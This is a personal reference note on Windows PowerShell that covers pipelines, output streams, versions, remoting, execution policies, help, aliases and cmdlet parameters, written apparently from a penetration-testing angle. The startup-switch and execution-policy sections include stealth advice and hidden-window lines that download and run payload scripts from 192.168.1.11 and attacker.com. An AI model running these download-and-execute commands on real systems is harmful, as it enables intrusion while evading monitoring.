---
created: 2026-03-20
tags:
  - Windows
  - how_Windows_works
  - commands
---
## PowerShell

> **Windows PowerShell** is a task automation and configuration management framework developed by Microsoft. It combines a command-line shell with a scripting language built on the .NET Framework. Unlike CMD, which processes text, **PowerShell processes .NET objects**.

PowerShell is commonly used for tasks like:
- Provisioning servers, installing and configuring server roles (features, services).
- Managing Active Directory accounts and group objects.
- Creating, modifying, deleting files and directories.
- Managing file shares and NTFS permissions. 
- Administering Microsoft Extract and Microsoft 365.
- Interacting with [Azure](https://azure.microsoft.com/en-us/) and Entra ID.
- Security monitoring and incident response (querying logs, auditing user activity, etc.).
- Enumeration and information gathering.

> [!tip] If you need to stay stealthy and PowerShell's capabilities aren't required, CMD is quieter. PowerShell tends to generate more telemetry and is heavily monitored by modern EDR solutions. 
>- See [[Windows CMD]].

>[!tip]+
>Websites where you can check PowerShell commands or scripts quickly, free and without registration: 
>- [`HCODX — Online PowerShell Compiler`](https://hcodx.com/compiler/powershell)
>- [`tio.run — PowerShell`](https://tio.run/#powershell)
>- [`CoreInterview`](https://codeinterview.io/languages/powershell)

### How PowerShell works (in a nutshell)

- **PowerShell operates on .NET objects, not text.**
	- Cmdlets output **structured data objects** with properties and methods rather than text strings.
	- Pipelines in PowerShell (`|`, same as in CMD) pass **objects** between commands.
    - Text rendering only happens at the very end, when the output is displayed on the terminal.

> [!example]+
> ```powershell
> Get-Process | Where-Object {$_.CPU -gt 100}
> ```
> 
> What happens under the hood:
> 
> 1. `Get-Process` returns an array of **`System.Diagnostics.Process` .NET objects**.
> 2. The pipe passes each object to `Where-Object`.
> 3. `Where-Object` filters: for each object (`$_`), it checks the `CPU` property.
> 4. Matching objects are passed to the formatter, which renders the table you see.

- PowerShell is also a **scripting language** — it supports variables, loops, functions, error handling, integrates with .NET and COM objects.
- **PowerShell is case-insensitive by default** for command names, parameter names, and comparison operators.

>[!tip]+
>For comparison operators, can opt into case-sensitive behavior using the `c` prefix, e.g., `-ceq` instead of `-eq`. See [[#Comparison operators]].

### Output streams

- PowerShell has **seven distinct output streams** — not just `stdout` and `strderr`:

| Stream        | Number | Description                                                             | Redirection   | Cmdlet                                                                                                                    |
| ------------- | ------ | ----------------------------------------------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `Success`     | `1`    | Normal output.                                                          | `1>`/`>`      | [`Write-Output`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-output)           |
| `Error`       | `2`    | Terminating and non-terminating errors.                                 | `2>`          | [`Write-Error`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-error)             |
| `Warning`     | `3`    | Warning messages; shown in yellow by default.                           | `3>`          | [`Write-Warning`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-warning)         |
| `Verbose`     | `4`    | Verbose messages; suppressed unless `-Verbose` or `$VerbosePreference`. | `4>`          | [`Write-Verbose`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-verbose)         |
| `Debug`       | `5`    | Debug output; suppressed unless `-Debug`.                               | `5>`          | [`Write-Debug`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-debug)             |
| `Information` | `6`    | Informational messages (PS 5+).                                         | `6>`          | [`Write-Information`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-information) |
| `Progress`    | N/A    | For messages                                                            | Not supported | [`Write-Progress`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-progress)       |


>[!note] See [`about_Output_Streams — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_output_streams?view=powershell-7.5).

- Redirect errors to a file:

```powershell
Get-ChildItem C:\Windows\System32 2> errors.txt
```

- Suppress errors:

```powershell
Get-ChildItem C:\NonExistent -ErrorAction SilentlyContinue
```

>[!important] `-ErrorAction` is a **common parameter** supported by all PowerShell cmdlets.

>[!note] See [`Common Parameters — SS64`](https://ss64.com/ps/common.html).

>[!note]+ `Write-Host`
>The [`Write-Host`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-host?view=powershell-7.5) cmdlet is a special case — it writes directly to the console and bypasses the pipeline entirely. You can't capture its output in a variable. But it supports colored text and more formatting features:
>- Write a text with foreground red color and white background color, without printing a newline at the end:
>```powershell
>White-Host "Red on white" -ForegroundColor red -BackgroundColor white -NoNewline
>```

#### How PowerShell parses commands

When you type a command and press Enter:
1. PowerShell **tokenizes** the input line using a formal grammar (unlike CMD's simple text parsing).
2. **Expands variables** (`$var` syntax), evaluates **sub-expressions** (`$(...)`) and array sub-expressions (`@(...)`).
3. **Interprets special characters** — pipes (`|`), redirections (`>`, `>>`), semicolons (`;`), backtick escapes (`` ` ``), and grouping (`()`).
4. Determines if the command is a **cmdlet, function, alias, script, or external executable**, checking in that order; the first match wins.
5. **Executes** — cmdlets and functions run in-process within the PowerShell runtime; external executables are launched as separate processes via `CreateProcess()`.
6. Waits for completion and **captures exit codes** into `$LASTEXITCODE` (for external executables) and sets `$?` (`True`/`False`) to reflect success/failure of the most recent cmdlet cmdlet success.

>[!note]+ PowerShell executables
> - A **cmdlet** is a lightweight, single-function command implemented as a compiled .NET class and executed natively in the PowerShell runtime.
> - A **function** is a named, reusable block of code designed to perform a specific task.
> - An **external executable** refers to any non-PowerShell binary — like `.exe`, `.bat`, `.cmd` —  invoked from PowerShell. External executables run as child processes spawned via `CreateProcess()`, and **output is captured as text strings rather than .NET objects**.
> - A **pipeline** is a sequence of commands connected by the pipe operator (`|`) which passes .NET objects from the output of one command to the input of the next.
>  - An **alias** is a shorthand name for a cmdlet or function (e.g., `ls` → `Get-ChildItem`).

### PowerShell versions

On Windows systems, you will encounter two distinct PowerShell lineages:


- **Windows PowerShell 5.1**
	- The default on Windows 10, Windows 11, and Windows Server 2016+; it's preinstalled, and it's the version you're most likely to encounter on target systems.
	- Windows-only, only receives security updates.

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

- **PowerShell 7+**
	- Modern, cross-platform version that runs on Windows, Linux, and macOS.
	- Must be installed separately.
	- Actively developed, open-source (MIT license). 

```
C:\Program Files\PowerShell\7\pwsh.exe
```

| Version                    | Edition tag | Platform              | Status                | Default location                                                                                                           |
| -------------------------- | ----------- | --------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **Windows PowerShell 5.1** | `Desktop`   | Windows only          | Security updates only | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`<br>`C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` |
| **PowerShell 7+**          | `Core`      | Windows, Linux, macOS | Actively developed    | `C:\Program Files\PowerShell\7\pwsh.exe`                                                                                   |

- Check which version is running:

```powershell
$PSVersionTable
```

>[!example]-
> ```powershell
> $PSVersionTable
> ```
> 
> ```powershell
> Name                           Value
> ----                           -----
> PSVersion                      7.5.3
> PSEdition                      Core
> GitCommitId                    7.5.3
> OS                             Ubuntu 20.04.6 LTS
> Platform                       Unix
> PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
> PSRemotingProtocolVersion      2.3
> SerializationVersion           1.1.0.1
> WSManStackVersion              3.0
> 
> ```

>[!note] `PSEdition: Desktop` means Windows PowerShell 5.1; `PSEdition: Core` means PowerShell 7+. The `CLRVersion` field (present in `Desktop` but not `Core`) tells you the underlying .NET Framework version.
## Calling PowerShell

**Local access:**

- `Win + R`, then type `powershell` or `pwsh`.
- Right-click `Start` -> `Windows PowerShell` (or `Terminal`).
- Start PowerShell from CMD: `powershell.exe` or `pwsh.exe`.
- From a running process: spawn via `CreateProcess`, `WMI`, Task Scheduler, etc.
- Using [`Windows Terminal`](https://github.com/Microsoft/Terminal) (`wt.exe`).
- Using [`PowerShell ISE`](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.5&viewFallbackFrom=powershell-7.2).

>[!note] **[`Windows Terminal`](https://github.com/Microsoft/Terminal)** is an (unexpectedly) open-source terminal emulator developed by Microsoft for Windows 10 and Windows 11.

>[!note] **[`Windows PowerShell ISE (Integrated Scripting Environment)`](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.5&viewFallbackFrom=powershell-7.2)** is a graphical application that provides a dedicated environment for writing, testing, debugging, and running PowerShell scripts. It was designed to enhance scripting experience features like syntax highlighting, tab completion, selective execution, breakpoints, etc.
>- PowerShell ISE is **no longer in active development** and is largely replaced by PowerShell extension for Visual Studio Code; though it's still available and supported Windows 10, 11, and Windows Server up to PowerShell 5.1.

**Remote access:**

- `PSRemoting` (WinRM) — standard enterprise method:

```PowerShell
Enter-PSSession -ComputerName <target> -Credential (Get-Credential)
```

>[!note] `PSRemoting` uses WinRM (Windows Remote Management) over port `5985` (HTTP) or `5986` (HTTPS). It's enabled by default on Windows Server 2012+ and can be enabled with `Enable-PSRemoting -Force`.

- `PsExec` (external tool, spawns `cmd.exe` or `powershell`):

```powershell
PsExec.exe \\<target> -u Administrator -p passwd powershell.exe
```

- WinRM via `winrs`:

```powershell
winrs -r:<target> -u:Administrator -p:passwd powershell.exe
```
### Startup switches

| Switch                     | Short Form   | Description                                                     |
| -------------------------- | ------------ | --------------------------------------------------------------- |
| `-Command <cmd>`           | `-c`         | Execute a command string, then exit.                            |
| `-File <script.ps1>`       |              | Execute a script file, then exit.                               |
| `-NoProfile`               | `-nop`       | Skip loading `$PROFILE` scripts. Faster and stealthier.         |
| `-NonInteractive`          | `-noni`      | Suppress interactive prompts; used in pipelines and automation. |
| `-WindowStyle Hidden`      | `-w hidden`  | Spawn with a hidden console window.                             |
| `-ExecutionPolicy Bypass`  | `-ep bypass` | Override the execution policy for this session only.            |
| `-EncodedCommand <Base64>` | `-enc`       | Accept a Base64-encoded UTF-16LE command string.                |
| `-NoExit`                  | `-noe`       | Stay open after running startup commands.                       |
| `-NoLogo`                  | `-nol`       | Suppress the startup banner.                                    |
| `-InputFormat`             |              | Set input format: `Text` or `XML`.                              |
| `-OutputFormat`            |              | Set output format: `Text` or `XML`.                             |

- Run a command, then exit:

```powershell
powershell.exe -c "Get-Process | Select-Object Name, CPU | Sort-Object CPU -Descending"
```

- Execute a script with policy bypass:

```powershell 
powershell.exe -ep bypass -File C:\Scripts\enum.ps1
```

- Run without loading user profile (faster, less noisy):

```powershell
powershell.exe -nop -c "whoami /all"
```

- Classic stealthy execution pattern (seen constantly in the wild):

```powershell
powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.11/payload.ps1')"
```

- Run a Base64-encoded command (common in payloads):

```powershell 
powershell.exe -enc <base64_encoded_command>
```

>[!warning] `-EncodedCommand` accepts a Base64-encoded UTF-16LE (Unicode) string — not standard UTF-8 Base64.

>[!example]+ Crafting a Base64-encoded UTF-16LE command
> ```powershell
> $cmd = 'Get-LocalUser | Where-Object { $_.Enabled -eq $true }'
> $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
> powershell.exe -enc $encoded
> ```

> [!warning] The `-nop -w hidden -ep bypass` combination is a well-known execution pattern commonly used in obfuscation, but virtually every modern EDR flags it today. `-EncodedCommand` is often included in signatures, too. These techniques are still valid in many environments, but chances are high that they get detected.

## Execution policies 

>**PowerShell execution policies** are a safety feature in PowerShell that control how scripts are loaded and executed on a system.

- Execution policies are designed to prevent accidental execution of dangerous scripts. But these are **not a security boundary**, and they can be bypassed.
- PowerShell defines the following execution policies:

| **Policy**     | **Description**                                                                                                                                                                                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Restricted`   | No scripts are allowed, only interactive commands.<br>`.ps1`, `.psm1`, `.ps1xml`, etc. are all blocked.                                                                                                                                                              |
| `AllSigned`    | Scripts can run, but every script must be **digitally signed**. <br>This applies to both local and remote scripts.<br>Prompts before running scripts signed by new publishers that aren't yet listed as trysted or untrusted.<br>Used in high-security environments. |
| `RemoteSigned` | All local scripts can run, but remote scripts downloaded from the Internet must be signed.                                                                                                                                                                           |
| `Unrestricted` | All scripts can run. Prompts for scripts downloaded from the Internet.<br>The default execution policy for non-Windows computers, and it can't be changed.                                                                                                           |
| `Bypass`       | All scripts, both local and remote, run without restrictions or warnings.                                                                                                                                                                                            |
| `Default`      | This sets the default execution policy, `Restricted` for Windows desktop machines and `RemoteSigned` for Windows servers.                                                                                                                                            |
| `Undefined`    | No execution policy is set for the current scope.<br>If the execution policy for all scopes is set to `Undefined`, then the default execution policy of `Restricted` will be used.                                                                                   |

- Policies can be applied at different **scopes**. Higher scopes override lower ones:

| Policy scope    | Description                                                                                                                                                               |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MachinePolicy` | Set via Group Policy for all users on the computer. This scope overrides all others and is used for centralized management in domain environments.                        |
| `UserPolicy`    | Set via Group Policy for the current user; overrides `LocalMachine` and `CurrentUser` scopes but **can't be modified locally**.                                           |
| `Process`       | Applies only to the current PowerShell session. The policy is stored in the `$env:PSExecutionPolicyPreference` environment variable and is deleted when the session ends. |
| `CurrentUser`   | Applies only to the current user and is stored in the `HKEY_CURRENT_USER` registry branch; affects only the logged-in user.                                               |
| `LocalMachine`  | Applies to all users on the computer and is stored in the `HKEY_LOCAL_MACHINE` registry branch; the **default scope** when no scope is specified.                         |

- Check current execution policy:

```powershell
Get-ExecutionPolicy
```

- Check execution policy at all scopes:

```powershell
Get-ExecutionPolicy -List
```

>[!example]+
> ```powershell
> Get-ExecutionPolicy -List
> ```
> 
> ```powershell
>         Scope ExecutionPolicy
>         ----- ---------------
> MachinePolicy    Unrestricted
>    UserPolicy    Unrestricted
>       Process    Unrestricted
>   CurrentUser    Unrestricted
>  LocalMachine    Unrestricted
> ```

- Set policy for current user:

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

- Set for current process only (session-scoped):

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

### Bypassing execution policy 


- Session-level bypass via startup switch (most common):

```powershell
powershell.exe -ep bypass
```

```powershell
powershell.exe -ExecutionPolicy Unrestricted
```

- Set process scope from within a running session:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

- Bypass by reading the script content and invoking it directly (works because you're executing code in a string, in-memory, not loading a script file):

```powershell
Get-Content script.ps1 | Invoke-Expression
iex (Get-Content script.ps1 -Raw)
```

- Download an execute without writing to disk:

```powershell
iex (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

- Bypass via Base64 encoding (policy doesn't apply to `-enc`):

```powershell
$cmd = "Get-LocalUser"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -enc $enc
```

- Unblock a specific file (removes `Zone.Identifier` alternate data stream):

```powershell
Unblock-File -Path .\script.ps1
```

>[!interesting] The `Unblock-File` technique is interesting — Windows marks files downloaded from the Internet with a Zone Identifier stored in an NTFS Alternate Data Stream (ADS). PowerShell respects this mark when `RemoteSigned` policy is active. Removing the ADS makes the file appear "local" to the policy engine.
## Getting around — help and discovery

| Cmdlet                                                                                                      | Description                                                                           | Alias         |
| ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- | ------------- |
| [`Get-Help`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help)        | Retrieve documentation for cmdlets, functions, and topics.                            | `man`, `help` |
| [`Get-Command`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-command)  | Discover cmdlets, functions, aliases, and scripts available in the session or system. | `gcm`         |
| [`Get-Member`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-member) | Inspect the properties and methods of any .NET object.                                | `gm`          |
| [`Get-Alias`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias)   | List available command aliases.                                                       | `gal`         |

### Get-Help

- Get help for a cmdlet:

```powershell
Get-Help Get-Process
```

- Detailed help with parameter descriptions:

```powershell 
Get-Help Get-Process -Detailed
```

- Full help including examples;

```powershell
Get-Help Get-Process -Full
```

- Just the examples:

```powershell
Get-Help Get-Process -Examples
```

- Search for cmdlets matching a keyword:

```powershell
Get-Help *network*
```

```powershell
Get-Help *firewall*
```

- Update help from Microsoft (requires internet + Administrator privileges):

```powershell 
Update-Help
```


> [!note] On fresh Windows installs, local help content may not be downloaded. Run `Update-Help` once to populate it. Until then, `-Online` is your fallback.


- `Get-Help` options:

| Option              | Description                                                                                    |
| ------------------- | ---------------------------------------------------------------------------------------------- |
| `-Full`             | Complete documentation including syntax, all parameters, inputs, outputs, notes, and examples. |
| `-Detailed`         | Parameter descriptions and examples — more than default, less than Full.                       |
| `-Examples`         | Only usage examples. Great for quick reference.                                                |
| `-Online`           | Opens official Microsoft documentation in browser.                                             |
| `-Parameter <name>` | Help for one specific parameter only.                                                          |
| `-ShowWindow`       | Opens help in a GUI window. Useful for long docs.                                              |
| `-Category <type>`  | Filter by category (Alias, Cmdlet, Function, etc.).                                            |


### Get-Command

>[!note] `Get-Command` is how you discover what's available — in your current session or across all installed modules. It's useful when you know roughly what you want to do but can't remember the exact cmdlet name.

- List all cmdlets, functions, and aliases in the current session:

```powershell
Get-Command
```

- Search by name:

```powershell
Get-Command *process*
```

```powershell
Get-Command *network*
```

- Search by verb (what it does):

```powershell
Get-Command -Verb Get
```

```powershell
Get-Command -Verb Invoke
```

- Search by noun (what it operates on):

```powershell
Get-Command -Noun Process
```

```powershell
Get-Command -Noun Process
```

- Combine verb and noun:

```powershell
Get-Command -Verb Get -Noun *user*
```

```powershell
Get-Command -Verb New -Noun *AD*
```

- Find all cmdlets from a specific module:

```powershell
Get-Command -Verb New -Noun *AD*
```

```powershell
Get-Command -Module NetTCPIP
```

- Find cmdlets with a specific parameter:

```powershell
Get-Command -ParameterName ComputerName
```

- Show command syntax:

```powershell
Get-Command Get-ChildItem -Syntax
```

| Option                  | Description                                                      |
| ----------------------- | ---------------------------------------------------------------- |
| `-Name <pattern>`       | Filter by name (wildcards supported).                            |
| `-Verb <verb>`          | Filter by PowerShell verb (`Get`, `Set`, `New`, `Remove`, etc.). |
| `-Noun <noun>`          | Filter by noun portion of cmdlet name.                           |
| `-Module <name>`        | Show only commands from a specific module.                       |
| `-CommandType <type>`   | Filter by type: Cmdlet, Function, Alias, Script, Application.    |
| `-ParameterName <name>` | Find commands that expose a specific parameter.                  |
| `-Syntax`               | Show command syntax only.                                        |
| `-ListImported`         | Show only commands loaded in the current session.                |
| `-All`                  | Show all versions including duplicates.                          |
| `‑TotalCount <int>`     | Limit the number of results returned.                            |

### Aliases

> **Aliases** in PowerShell are alternate names for cmdlets or functions, defined either by the shell itself, by loaded modules, or by the user, resolved during the command discovery phase before cmdlet lookup.

PowerShell ships with a large number of built-in aliases designed to ease the transition for users coming from CMD and Unix shells, like `ls`, `dir`, `cd`, `cat`, `rm`, `cp`, `mv`, etc. (but options are different, of course).

- List all available aliases:

```powershell
Get-Alias
```

> [!example]+
> ```powershell
> Get-Alias
> ```
> 
> ```powershell
> CommandType     Name                 Version    Source
> -----------     ----                 -------    ------
> Alias           ? -> Where-Object                                             
> Alias           % -> ForEach-Object                                           
> Alias           cd -> Set-Location                                            
> Alias           chdir -> Set-Location                                         
> Alias           clc -> Clear-Content                                          
> Alias           clhy -> Clear-History                                         
> Alias           cli -> Clear-Item                                             
> Alias           clp -> Clear-ItemProperty                                     
> Alias           cls -> Clear-Host                                             
> Alias           clv -> Clear-Variable                                         
> Alias           copy -> Copy-Item                                             
> Alias           cpi -> Copy-Item                                              
> Alias           cvpa -> Convert-Path                                          
> Alias           dbp -> Disable-PSBreakpoint                                   
> Alias           del -> Remove-Item                                            
> Alias           dir -> Get-ChildItem                                          
> Alias           ebp -> Enable-PSBreakpoint                                    
> Alias           echo -> Write-Output                                          
> Alias           epal -> Export-Alias                                          
> Alias           epcsv -> Export-Csv                                           
> Alias           erase -> Remove-Item                                          
> Alias           etsn -> Enter-PSSession 
> ```

- Find a full cmdlet name for an alias:

```powershell
Get-Alias ls
```

```powershell
Get-Alias iex
```

- Find aliases for a specific cmdlet:

```powershell
Get-Alias -Definition Get-ChildItem
```

- Create an alias for the current session:

```powershell
Set-Alias -Name "Show-Files" -Value Get-ChildItem
```

- Create a new alias:

```powershell
New-Alias -Name "ll" -Value Get-ChildItem
```

>[!warning] In PowerShell, `sc` is aliased to `Set-Content`. This conflicts with `sc.exe` (the Windows Service Controller binary). Specify `sc.exe` explicitly.


- Common aliases:

| Alias               | Cmdlet              |
| ------------------- | ------------------- |
| `ls`, `dir`, `gci`  | `Get-ChildItem`     |
| `cd`, `sl`, `chdir` | `Set-Location`      |
| `pwd`               | `Get-Location`      |
| `cat`, `gc`, `type` | `Get-Content`       |
| `iex`               | `Invoke-Expression` |
| `icm`               | `Invoke-Command`    |
| `?`, `where`        | `Where-Object`      |
| `%`, `foreach`      | `ForEach-Object`    |
| `select`            | `Select-Object`     |
| `sort`              | `Sort-Object`       |
| `sls`               | `Select-String`     |
| `gm`                | `Get-Member`        |
| `man`, `help`       | `Get-Help`          |
## History

- Show commands run in this session:

```powershell
Get-History
```

- Re-run a command from history by its ID number

```powershell
Invoke-History 14
```

```powershell
r 14 # using the alias
```

- Clear session history:

```powershell
Clear-History
```

>[!important] Session history (`Get-History`, `Invoke-History`, `Clear-History`) covers only the **current session** — it disappears when PowerShell exits.

- There's a persistent history file file maintained by `PSReadLine`:

```powershell
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- Read the `PSReadLine` persistent history:

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

This file contains commands from multiple sessions.

## Hotkeys

- Execution and command history:

| Hotkey     | Description                                                     |
| ---------- | --------------------------------------------------------------- |
| `↑` / `↓`  | Navigate command history.                                       |
| `Ctrl + R` | Reverse incremental history search.                             |
| `Ctrl + S` | Forward incremental history search.                             |
| `F7`       | Graphical command history list (popup).                         |
| `F8`       | Search backward in history for commands matching current input. |
| `Ctrl + C` | Cancel current command or interrupt running process.            |
| `Ctrl + D` | Exit the PowerShell session.                                    |
| `Ctrl + L` | Clear screen (same as `cls`).                                   |
| `Alt + F7` | Clear command history.                                          |

- Cursor navigation:

| Hotkey                  | Description                       |
| ----------------------- | --------------------------------- |
| `Ctrl + ←` / `Ctrl + →` | Move cursor one word left/right.  |
| `Home` / `End`          | Jump to beginning/end of line.    |
| `Ctrl + A`              | Move cursor to beginning of line. |
| `Ctrl + E`              | Move cursor to end of line.       |

- Auto-completion:

| Hotkey         | Description                                                                  |
| -------------- | ---------------------------------------------------------------------------- |
| `Tab`          | Autocomplete command, path, or parameter. Press repeatedly to cycle options. |
| `Shift + Tab`  | Cycle backwards through completions.                                         |
| `Ctrl + Space` | Show all available completions in a list.                                    |

- Clipboard (just standard ones):

| Hotkey                 | Description                    |
| ---------------------- | ------------------------------ |
| `Ctrl + C`             | Copy selected text.            |
| `Ctrl + V`             | Paste clipboard contents.      |
| `Ctrl + A`             | Select entire command line.    |
| `Shift + Arrow`        | Extend selection by character. |
| `Ctrl + Shift + Arrow` | Extend selection by word.      |

- View all keyboard bindings:

```powershell
Get-PSReadLineKeyHandler
```

## Cmdlets

>A **[cmdlet](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.5)** (pronounced *command-let*) is a lightweight command compiled as a .NET class and executed natively within the PowerShell runtime.

- Cmdlets **run natively in the PowerShell environment** and **within the PowerShell process itself**; they are not external programs.

- All cmdlets adhere a strict `Verb-Noun` naming convention, where the verb signifies the action the cmdlet performs, and the noun signifies the object type the cmdlet operates on.
	- Microsoft maintains a [list of approved verbs for PowerShell commands](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.5), such as `Get`, `Set`, `New`, `Remove`, `Invoke`, `Start`, `Stop`, etc.
	- Unapproved verbs are allowed, but will generate warnings when you import a module that contains them.
	- PowerShell will want you if you write a function or module that uses an unapproved verb.
- Approved PowerShell verbs are divided into **groups** based on the type of action they represent:

| Group             | Description                                                                   | Examples                                                                                                                                           |
| ----------------- | ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Common**        | Generic actions that operate on most types of objects.                        | `Add`, `Clear`, `Copy`, `Get`, `Set`, `Remove`, `Rename`, `Move`, `New`                                                                            |
| **Communication** | Actions related to establishing, managing, using connections or data streams. | `Connect`, `Disconnect`, `Send`, `Read`                                                                                                            |
| **Data**          | Actions related to data handling (e.g., transferring between formats).        | `Backup`, `Checkpoint`, `Compare`, `Compress`, `Export`, `Import`, `Restore`, `Sync`, `Save`                                                       |
| **Diagnostic**    | Actions used for troubleshooting and diagnostics.                             | `Debug`, `Measure`, `Ping`, `Repair`, `Resolve`, `Test`                                                                                            |
| **Lifecycle**     | Actions that manage the lifecycle of a resource or process.                   | `Approve`, `Build`, `Complete`, `Deploy`, `Install`, `Invoke`, `Register`, `Start`, `Stop`, `Submit`, `Suspend`, `Uninstall`, `Unregister`, `Wait` |
| **Security**      | Actions related to access control and security.                               | `Block`, `Grant`, `Protect`, `Revoke`, `Unprotect`                                                                                                 |
| **Other**         | Miscellaneous; actions that don’t fit into the above categories.              | `Enter`, `Exit`, `Format`, `Hide`, `Join`, `Lock`, `Pop`, `Push`, `Show`, `Split`, `Step`, `Switch`, `Undo`, `Unlock`                              |

>[!note] See [`Approved Verbs for PowerShell Commands — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.5).

- List all approved verbs and their groups:

```powershell
Get-Verb
```

- Filter by pattern:

```powershell
Get-Verb -Verb "Get*"
```

- List verbs in a specific group:

```powershell
Get-Verb | Where-Object Group -eq "Security" 
```

>[!example]+
> 
> ```powershell
> Get-Verb | Where-Object Group -eq "Security" | ft -AutoSize -Wrap
> ```
> 
> ```powershell
> Verb      AliasPrefix Group    Description
> ----      ----------- -----    -----------
> Block     bl          Security Restricts access to a resource
> Grant     gr          Security Allows access to a resource
> Protect   pt          Security Safeguards a resource from attack or loss
> Revoke    rk          Security Specifies an action that does not allow access to a resource
> Unblock   ul          Security Removes restrictions to a resource
> Unprotect up          Security Removes safeguards from a resource that were added to prevent it from attack or loss
> ```

- Explore what a cmdlet imports (discover properties and methods):

```powershell
Get-Process | Get-Member
```

```powershell
Get-Service | Get-Member | Where-Object MemberType -eq Property
```

- Some cmdlets are built into PowerShell itself (`Get-Help`, `Get-Command`, `Get-Process`).
- Others come from modules that are either loaded on-demand or must be installed.
- Many Microsoft products add custom cmdlets, such as Microsoft Exchange Server (`ExchangeOnlineManagement` module), Microsoft Azure (`Az`), and Active Directory (`ActiveDirectory`).


### Common parameters

>[!note] See [`Common Parameter Names — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/common-parameter-names?view=powershell-7.5) and [`Common Parameters — SS64`](https://ss64.com/ps/common.html).


All cmdlets automatically support a set of common, standardized parameters:

#### General common parameters

| Parameter                     | Description                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-Debug`, `-db`               | Show developer/debug messages (from `Write-Debug`). Overrides `$DebugPreference`.                                                                     |
| `-ErrorAction`, `-ea`         | Specify how non-terminating error messages are handled.<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`, `Suspend` (workflow). |
| `-ErrorVariable`, `-ev`       | Store error messages in a variable (append with `+`).                                                                                                 |
| `-InformationAction`, `-infa` | Specify how information messages are handled (`Write-Information`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`.           |
| `-InformationVariable`, `-iv` | Store informational messages in a variable.                                                                                                           |
| `-OutBuffer`, `-ob`           | Buffer a specified number of objects before passing to next pipeline stage.                                                                           |
| `-OutVariable`, `-ov`         | Store command output in a variable (append with `+`).                                                                                                 |
| `-ProgressAction`, `-proga`   | Specify how progress messages (progress bars) are handled (`Write-Progress`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`. |
| `-Verbose`, `-vb`             | Show detailed operation messages (`Write-Verbose`). Overrides `$VerbosePreference`.                                                                   |
| `-WarningAction`, `-wa`       | Specify how warning messages are handled (`Write-Warning`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`.                   |
| `-WarningVariable`, `-wv`     | Store warning messages in a variable.                                                                                                                 |

- Show verbose output:

```powershell
Get-Process -Verbose
```

- Show debug output:

```powershell
Get-Process -Debug
```

- Stop on the first non-terminating error:

```powershell
Get-Item "C:\Nope.txt" -ErrorAction Stop
```

- Capture errors in the `$err` variable:

```powershell
Get-Item "C:\Nope.txt" -ErrorVariable err
```

- Suppress informational messages:

```powershell
Get-Service -InformationAction SilentlyContinue
```


- Capture informational messages in the `$info` variable:

```powershell
Get-Service -InformationVariable info
```

- Save the output to `$files` (but still send it down the pipeline):

```powershell
Get-ChildItem -OutVariable files
```

- Suppress the progress bar for commands that normally show one:

```powershell
Copy-Item file1.txt file2.txt -ProgressAction SilentlyContinue
```

- Ensure warnings are displayed (default behavior):

```powershell
Remove-Item "C:\Temp" -WarningAction Continue
```
#### Risk-mitigation parameters

| Parameter         | Description                                                                        |
| ----------------- | ---------------------------------------------------------------------------------- |
| `-Confirm` ,`-cf` | Prompt before executing potentially risky actions. Overrides `$ConfirmPreference`. |
